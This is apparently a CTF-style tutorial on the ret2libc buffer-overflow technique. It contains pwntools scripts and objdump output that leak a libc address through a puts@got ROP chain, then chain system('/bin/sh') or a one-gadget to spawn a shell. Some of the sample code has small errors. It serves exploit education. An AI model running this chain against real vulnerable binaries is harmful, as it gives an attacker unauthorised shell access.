# ret2libc

ret2libc is a technique that involves calling functions from LIBC that aren't already loaded in the binary's Global Offset Table (GOT). This is a subset of stack-based exploits, aka. buffer overflows.

## Global Offset Table

The GOT is a table of functions that are loaded from a LIBC into a binary. This table is dynamically generated each time the binary is ran, and only consists of functions that are needed in the program to save space (this is determined at compliation)

The table looks like this:

| Address of function in binary         | Address of function in LIBC (accounting for LIBC base)    |
| ------------------------------------- | --------------------------------------------------------- |
| 0x0000000000400123                    | 0x7f12345678123456                                        |

When the binary calls a function, it will call the address in the left column. This will then redirect to the address in the right column.

## ret2libc part 1 (leaking libc base)

Due to ASLR, our LIBC base is randomized, so all functions that haven't been loaded into the GOT cannot be called. 

Fortunately, the internal offsets of the functions in LIBC aren't randomized. Thus, our objective is to leak the address of a function from GOT, and use it to determine LIBC base.

First we need the address of the function puts() (can be any other libc function that has been used at least once, and hence loaded into GOT) and the address of the GOT entry.

### Method 1: Automated (pwntools)

> This method is recommended for CTFs but not recommended for learning.

```py
from pwn import *

# --- setup ---
elf = context.binary = ELF('./binary')
rop = ROP('./binary')

# Address of main
main = elf.symbols["main"]

# Address of puts (in the binary)
puts = elf.symbols["puts"]

# Address of GOT entry of puts
puts_got = elf.got["puts"]

# Address of pop rdi gadget
pop_rdi = rop.rdi.address

# For the rest of the exploit, refer to Method 2: Manual
```

### Method 2: Manual

```bash
$ objdump -d ./binary | grep puts
0000000000400900 <puts@plt>:
    400900:       ff 25 22 17 20 00       jmpq   *0x201722(%rip)        # 602028 <puts@GLIBC_2.2.5>
    400906:       68 02 00 00 00          pushq  $0x2
    40090b:       e9 c0 ff ff ff          jmpq   4008d0 <.plt>
```

So, the address of puts is 0x400900, and the address of the GOT entry is 0x602028.

> We need the binary address of puts (or any other function that outputs to stdout) so we can call it to output our leak.

We also need the address of the main function, which can be found via `info functions` in gdb, or `afl` in r2.

```
...
0x0000000000400d77  setup
0x0000000000400df8  win
0x0000000000400e80  main
0x0000000000401040  __libc_csu_init
0x00000000004010b0  __libc_csu_fini
...
```

> We return to main after our leak, as we need to re-exploit the buffer overflow in the same process.

Now that we have these three values, we're gonna use them to leak the address of the libc puts(). Using that and the offset of puts() in libc (puts\_libc - puts\_offset), we can calculate the base address of libc in the binary.

To pass in puts@got as a parameter, we need to use the pop\_rdi gadget. `ROPgadget --binary ./binary | grep rdi`

```py
from pwn import *

p = process('./binary')
offset = 28+8
pop_rdi = 0x400913
puts = 0x400900
puts_got = 0x602028
main = 0x400e80
payload = flat(
		b'A'*offset,
		pop_rdi, puts_got,
		puts, 
		main,
)
p.sendline(payload)
puts_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
logs.info("puts addr: " + puts_addr)
```

---

## ret2libc part 2 (calling shell)

Now, the binary should print out the address of puts() in libc, and we can:
1. Determine the libc version used (copy puts\_addr and search it with [https://libc.rip/](this), selecting the \_IO\_puts function.)
    - If the binary is 64-bit, the libc has to be 64-bit. Any 32-bit libcs can be eliminated from the results.
    - For the remaining libcs, if their offsets for puts() are the same, they're essentially the same.
    - Download the correct libc and place it in the challenge folder. To tell pwntools to use that libc, add this:
    ```py
    ...
    env = {"LD_PRELOAD":"libc6_2.27-3ubuntu1.4_amd64.so"}
    with process("./binary", env=env) as p:
    ...
    ```
		- This doesn't really work all the time, depending on your environment, so another option is to just run your script on remote. (You won't be able to `gdb.attach(p)` anymore though)
    - Take note also of the offset of the \_IO\_puts function indicated in the website.

2. Determine the base address of libc.
    - libc\_base = puts\_addr - puts\_offset

> If the challenge provides LIBC (`libc.so.6`), you don't need to search for the LIBC in the database.
> To get the offset of puts in LIBC, just do the following:
> `libc = ELF('./libc.so.6')`
> `puts_offset = libc.symbols["puts"]`

> Note that the final libc base address must end in 00. If that's not your case you might have leaked an incorrect LIBC.

### Call system('/bin/sh')

This is arguably easier than one gadget, as the only constraint to be fulfilled is $rdi = address of '/bin/sh'. (x64) The above libc database already gives us the offset of both system and a '/bin/sh' string in the LIBC, so all we need to do is to calculate their address from the LIBC base address. 

system = libc\_base + {offset}

binsh = libc\_base + {offset}

> Note: Take the offsets from the offset column, not the difference column!

After this, we can reuse the pop\_rdi gadget from earlier to pass in the address of '/bin/sh'. We might need an additional ret gadget to align the stack to 16 bytes. 

The ROP chain should look something like this:

pop rdi -> binsh -> ret -> system 

Enjoy the shell!

### One gadget

One-gadgets are gadgets in the libc that call `/bin/sh` directly (provided certain conditions are met). 

One-gadget is a more advanced technique, but it can be way faster if the conditions are already fulfilled.

However, these gadgets are different for every libc, so we need to determine the libc version first. One way to do this is to leak the offset of a loaded function (like puts()) in the libc, by leaking the value stored in the GOT entry of the function.

Run this on the libc to get the offsets of all avaliable one-gadgets: 

```bash
$ one_gadget ./libc6_2.27-3ubuntu1.4_amd64.so
```

Call each gadget in succession until you get a gadget whose conditions are fulfilled at the point of calling the ROP chain.
